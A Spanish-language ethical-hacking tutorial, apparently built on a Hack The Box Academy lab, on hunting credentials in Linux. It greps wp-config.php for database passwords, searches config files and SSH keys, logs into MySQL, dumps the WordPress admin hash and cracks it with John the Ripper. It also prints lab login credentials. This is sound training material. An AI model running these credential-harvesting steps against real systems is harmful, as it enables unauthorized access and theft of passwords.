
# Búsqueda de credenciales en Linux

Al enumerar un sistema, es importante anotar las credenciales. Estas pueden encontrarse en archivos de configuración ( `.conf`, `.config`, `.xml`, etc.), scripts de shell, el archivo de historial de bash de un usuario, archivos de respaldo (`.bak`), dentro de archivos de base de datos o incluso en archivos de texto. Las credenciales pueden ser útiles para escalar a otros usuarios o incluso a la raíz, acceder a bases de datos y otros sistemas dentro del entorno.

El directorio `/var` normalmente contiene la raíz web de cualquier servidor web que se esté ejecutando en el host. La raíz web puede contener credenciales de base de datos u otros tipos de credenciales que se pueden aprovechar para obtener más acceso. Un ejemplo común son las credenciales de la base de datos MySQL dentro de los archivos de configuración de WordPress:

```shell-session
htb_student@NIX02:~$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

Los directorios de spool o de correo, si son accesibles, también pueden contener información valiosa o incluso credenciales. Es común encontrar credenciales almacenadas en archivos en la raíz web (es decir, cadenas de conexión MySQL, archivos de configuración de WordPress).

```shell-session
htb_student@NIX02:~$  find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null

/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/python3/debian_config
/etc/kbd/config
/etc/manpath.config
/boot/config-4.4.0-116-generic
/boot/grub/i386-pc/configfile.mod
/sys/devices/pci0000:00/0000:00:00.0/config
/sys/devices/pci0000:00/0000:00:01.0/config
<SNIP>
```

***

## <mark style="color:purple;">Claves SSH</mark>

También es útil buscar en el sistema claves privadas SSH accesibles. Podemos encontrar una clave privada para otro usuario más privilegiado que podamos usar para conectarnos nuevamente al equipo con privilegios adicionales. También podemos encontrar claves SSH que se puedan usar para acceder a otros hosts en el entorno. Siempre que encuentre claves SSH, verifique el archivo `known_hosts` para encontrar destinos. Este archivo contiene una lista de claves públicas para todos los hosts a los que el usuario se ha conectado en el pasado y puede ser útil para el movimiento lateral o para encontrar datos en un host remoto que se puedan usar para realizar una escalada de privilegios en nuestro objetivo.

```shell-session
htb_student@NIX02:~$  ls ~/.ssh

id_rsa  id_rsa.pub  known_hosts
```

Si deseas más información sobre este tema de Credential Hunting puedes revisar esta sección dedicada:

{% content-ref url="/pages/zIfv10AYKkDbbaHf34TR" %}
[Credential Hunting - Linux](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/linux-attacks/credential-hunting-linux.md)
{% endcontent-ref %}

{% content-ref url="/pages/FiA4f1I0RekV8H1KNzb8" %}
[Credential Hunting - Windows](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/windows-attacks/credential-hunting-windows.md)
{% endcontent-ref %}

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.2.210 (ACADEMY-LPE-NIX02)
Usuario " htb-student "
Contraseña " Academy_LLPE! "
```

Encuentra la contraseña de la base de datos de WordPress.

Lo primero debemos ubicar el archivo `wp-config.php`, que se suele ubicar en `/var/www/html`:

```shell-session
htb-student@NIX02:/var/www/html$ cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'W0rdpr3ss_sekur1ty!' );
```

Con estas credenciales podríamos acceder a la base de datos y obtener información confidencial o contraseñas, como en el ejemplo a continuación, donde obtenemos la contraseña del usuario administrador:

```sql
htb-student@NIX02:/var/www/html$ mysql -u wordpressuser -p
Enter password: W0rdpr3ss_sekur1ty!
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.42-0ubuntu0.18.04.1 (Ubuntu)

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| wordpress          |
+--------------------+

mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> SELECT ID, user_login, user_email, user_pass FROM wp_users;
+----+------------+---------------------------+------------------------------------+
| ID | user_login | user_email                | user_pass                          |
+----+------------+---------------------------+------------------------------------+
|  1 | admin      | admin@inlanefreight.local | $P$BN6.Ay/pOIQU8G1QKkKWeLOhrCI4ct/ |
+----+------------+---------------------------+------------------------------------+
1 row in set (0.00 sec)
```

Vemos que la contraseña se guarda en un formato phpass, por lo que vamos a crackearlo para obtener la contraseña en plano:

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ echo '$P$BN6.Ay/pOIQU8G1QKkKWeLOhrCI4ct/' > wp_hash.txt
</strong>
afsh4ck@kali$ john --format=phpass wp_hash.txt

Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst
admin            (?)     
</code></pre>

Como vemos, la contraseña del usuario admin es `admin`, una contraseña muy segura.
